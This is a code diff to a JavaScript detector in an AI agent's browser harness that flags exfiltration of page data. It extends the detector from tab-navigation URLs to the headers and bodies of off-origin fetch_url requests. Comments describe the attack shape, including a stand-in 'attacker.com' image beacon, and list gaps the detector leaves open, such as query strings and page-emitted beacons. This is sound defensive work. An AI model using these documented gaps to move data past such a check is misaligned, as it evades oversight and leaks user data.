@@ -1,6 +1,7 @@
 // @ts-check
-// egress-heuristics — best-effort detection of the DOM-data→URL
-// exfiltration shape in TAB-TOOL arguments. A TRIPWIRE, not a proof.
+// egress-heuristics: best-effort detection of the DOM-data→request
+// exfiltration shape in browser-session and actor-fetch arguments. A
+// TRIPWIRE, not a proof.
 //
 // WHY THIS EXISTS (#243). The egress-allowlist PreToolUse hook
 // (tools/hooks/defaults/egress-allowlist.js) governs the agent's OWN
@@ -62,6 +63,14 @@
 // negative is backstopped by #241/#242). Userinfo and hostname carry no such
 // legitimate blobs, and a path is normally `/`-segmented into short pieces, so
 // those three slots flag the exfil shape without breaking real flows.
+//
+// ACTOR fetch_url REQUEST PAYLOADS. A fetch body or header value does not share
+// the URL query's legitimate OAuth / presigned-link population: it is an
+// explicit payload sent to the chosen destination. For an off-origin fetch_url
+// call, scan transmitted header names + string values and the body with the SAME
+// dominant-run test. Object bodies are scanned in their JSON wire shape. Header
+// names are usually structural, but Fetch permits long token-shaped names; an
+// attacker can put the payload there just as easily as in the value.
 //
 // WHAT SPARES A PATH: the `/` boundaries, the 100-char length bar, AND — since
 // the prose rule landed — the SHAPE of the run. This paragraph used to say the
@@ -138,7 +147,8 @@
 // collapses past 100 chars in the HOST — is the accepted cost of catching the
 // contiguous-blob shape; #242 is the real containment.
 //
-// SCOPE. Tab-tool ARGS only. It does NOT cover the page-emitted
+// SCOPE. Browser-session tool args plus actor fetch_url request payloads. It
+// does NOT cover the page-emitted
 // `<img src="attacker.com/?d=…">` beacon vector: that data leaves via the
 // page's own network stack, not a tab-tool arg, so no arg-inspection can see
 // it. Beacons need a declarativeNetRequest layer — a separate follow-up.
@@ -398,12 +408,60 @@ const collectCandidateUrls = (args) => {
 };
 
 /**
+ * fetch_url transmits only args.url. Other URL-looking fields are ignored by
+ * the tool and must not turn a same-origin request into a false off-origin hit.
+ * @param {Record<string, unknown> | null | undefined} args
+ * @returns {string[]}
+ */
+const collectFetchUrls = (args) => {
+  if (!args || typeof args !== 'object') return [];
+  const url = /** @type {Record<string, unknown>} */ (args).url;
+  return typeof url === 'string' && url.trim() ? [url.trim()] : [];
+};
+
+/**
+ * Collect payload-bearing strings that fetch_url transmits outside the URL.
+ * Header names, values, and body bytes are attacker-readable at the destination.
+ * Object bodies are serialized because fetch_url sends that exact JSON shape.
+ * Never throws on an odd/cyclic value; the tripwire must not become a dispatch
+ * failure of its own.
+ * @param {Record<string, unknown> | null | undefined} args
+ * @returns {string[]}
+ */
+const collectFetchPayloads = (args) => {
+  if (!args || typeof args !== 'object') return [];
+  const record = /** @type {Record<string, unknown>} */ (args);
+  /** @type {string[]} */
+  const out = [];
+  const headers = record.headers;
+  if (headers && typeof headers === 'object' && !Array.isArray(headers)) {
+    try {
+      for (const [name, value] of Object.entries(headers)) {
+        if (name) out.push(safeDecode(name));
+        if (typeof value === 'string' && value) out.push(safeDecode(value));
+      }
+    } catch { /* a hostile accessor/proxy is not a valid JSON tool arg */ }
+  }
+  const body = record.body;
+  if (typeof body === 'string' && body) out.push(safeDecode(body));
+  else if (body && typeof body === 'object') {
+    try {
+      const serialized = JSON.stringify(body);
+      if (serialized) out.push(safeDecode(serialized));
+    } catch { /* an unserializable body is rejected elsewhere; allow here */ }
+  }
+  return out;
+};
+
+/**
  * Inspect a tab-tool call for the DOM-data→URL exfiltration shape.
  *
  * Returns `{ action: 'block', reason }` when the call would navigate/type an
  * OFF-origin http(s) URL whose userinfo, hostname, or path carries a single
  * URL-safe-encoded high-entropy run of ≥ MIN_BLOB_LENGTH characters — a
- * contiguous dumped blob. Everything else is `{ action: 'allow' }`, including
+ * contiguous dumped blob. An off-origin fetch_url call is also blocked when a
+ * header value or body carries that shape. Everything else is
+ * `{ action: 'allow' }`, including
  * same-origin targets, plain off-origin links (incl. deep readable paths), a
  * blob in the QUERY or FRAGMENT (the largest documented residual — those slots
  * are not scanned; see the header), non-URL typed text, empty/short args, a
@@ -424,13 +482,15 @@ const collectCandidateUrls = (args) => {
  * @returns {EgressVerdict}
  */
 export const inspectTabToolCall = (call) => {
-  // why: the default param only covers `undefined`; a caller that represents
-  // an absent record as `null` must not crash the destructure. Any non-object
-  // is "nothing to inspect" → allow.
-  const safeCall = (call && typeof call === 'object') ? call : {};
-  const { args, currentOrigin } = safeCall;
-  const candidates = collectCandidateUrls(args);
-  if (!candidates.length) return { action: 'allow' };
+  try {
+    // why: the default param only covers `undefined`; a caller that represents
+    // an absent record as `null` must not crash the destructure. Any non-object
+    // is "nothing to inspect" → allow.
+    const safeCall = (call && typeof call === 'object') ? call : {};
+    const { name, args, currentOrigin } = safeCall;
+    const candidates = name === 'fetch_url' ? collectFetchUrls(args) : collectCandidateUrls(args);
+    if (!candidates.length) return { action: 'allow' };
+    const fetchPayloads = name === 'fetch_url' ? collectFetchPayloads(args) : [];
 
   // NO CURRENT ORIGIN MEANS "we don't know where this actor has been", NOT
   // "it has been nowhere".
@@ -449,28 +509,44 @@ export const inspectTabToolCall = (call) => {
   // treatment an unparseable origin already got two lines below. A block still
   // requires a clear payload shape, so an ordinary first navigation is
   // unaffected.
-  const here = currentOrigin ? safeOrigin(currentOrigin) : null;
+    const here = currentOrigin ? safeOrigin(currentOrigin) : null;
 
-  for (const raw of candidates) {
-    let url;
-    try { url = new URL(raw); }
-    catch { continue; } // unparseable / relative → not a working exfil vector
-    if (!HTTP_SCHEMES.has(url.protocol)) continue;
-    // Same-origin is trivially allowed: sending data back to the site the
-    // agent is already on is not cross-origin exfiltration. (If currentOrigin
-    // was unparseable, `here` is null and we treat every target as off-origin
-    // — inspect it; we still only block on a clear payload.)
-    if (here && url.origin === here) continue;
-    if (largestExfilRun(payloadSlots(url)) >= MIN_BLOB_LENGTH) {
-      return {
-        action: 'block',
-        // why: content-free — see the doc comment above. Names the SHAPE,
-        // never the bytes, and claims only "likely", not a guarantee.
-        reason: 'egress-heuristics: off-origin tab navigation carrying a high-entropy '
-          + 'encoded payload in the URL userinfo/host/path — the likely '
-          + 'DOM-data exfiltration shape',
-      };
+    for (const raw of candidates) {
+      let url;
+      try { url = new URL(raw); }
+      catch { continue; } // unparseable / relative → not a working exfil vector
+      if (!HTTP_SCHEMES.has(url.protocol)) continue;
+      // Same-origin is trivially allowed: sending data back to the site the
+      // agent is already on is not cross-origin exfiltration. (If currentOrigin
+      // was unparseable, `here` is null and we treat every target as off-origin
+      // inspect it; we still only block on a clear payload.)
+      if (here && url.origin === here) continue;
+      if (largestExfilRun(payloadSlots(url)) >= MIN_BLOB_LENGTH) {
+        return {
+          action: 'block',
+          // why: content-free; see the doc comment above. Names the SHAPE,
+          // never the bytes, and claims only "likely", not a guarantee.
+          reason: 'egress-heuristics: off-origin tab navigation carrying a high-entropy '
+            + 'encoded payload in the URL userinfo/host/path; the likely '
+            + 'DOM-data exfiltration shape',
+        };
+      }
+      if (fetchPayloads.length > 0 && largestExfilRun(fetchPayloads) >= MIN_BLOB_LENGTH) {
+        return {
+          action: 'block',
+          // why: content-free; request bytes must not be reflected into the
+          // unfenced audit/reason surface.
+          reason: 'egress-heuristics: off-origin web request carrying a high-entropy '
+            + 'encoded payload in a request header/body; the likely DOM-data '
+            + 'exfiltration shape',
+        };
+      }
     }
+    return { action: 'allow' };
+  } catch {
+    // The inspector is a best-effort veto on a hot path, not an argument
+    // validator. JSON tool calls cannot carry accessors/proxies, but an earlier
+    // trusted hook can replace args; an exotic value must not crash dispatch.
+    return { action: 'allow' };
   }
-  return { action: 'allow' };
 };
